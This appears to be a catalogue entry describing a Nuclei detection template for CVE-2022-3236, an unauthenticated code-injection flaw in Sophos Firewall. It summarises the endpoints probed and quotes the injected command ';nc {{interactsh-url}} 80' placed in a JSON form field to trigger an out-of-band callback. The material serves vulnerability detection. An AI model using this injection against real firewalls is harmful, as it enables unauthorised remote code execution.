---
cve_id: CVE-2022-3236
template_path: nuclei-templates/http/cves/2022/CVE-2022-3236.yaml
affected_product: Sophos Firewall
severity: critical
authentication: none
external_callback: true
affected_versions: v19.0 MR1 and older
preconditions: []
poc_classification: rce
---

## Vulnerability
Sophos Firewall versions v19.0 MR1 and older are affected by a code-injection vulnerability (CWE-94) in the User Portal and Webadmin interfaces. Remote unauthenticated attackers can inject arbitrary OS commands, achieving full remote code execution with high impact on confidentiality, integrity, and availability (CVSS 3.1 base score 9.8, vector AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H). Exploitation can lead to complete system compromise.

## PoC / Detection
Classification: rce

The template detects the flaw via two raw HTTP POST requests (executed as http(1) || http(2) flow) to `/userportal/Controller` and `/webconsole/Controller`. Each request submits a crafted `application/x-www-form-urlencoded` payload containing a JSON structure that injects the command `;nc {{interactsh-url}} 80` into the `_discriminator.curvalue` field while supplying dummy login values (username=admin, password=x). Success is confirmed by an OOB DNS interaction on the interactsh domain plus response validators (status_code==200, body contains "redirectionURL", Content-Type text/plain, and specific Server header).

## References
- https://www.thezdi.com/blog/2022/10/19/cve-2022-3236-sophos-firewall-user-portal-and-web-admin-code-injection
- https://nvd.nist.gov/vuln/detail/cve-2022-3236
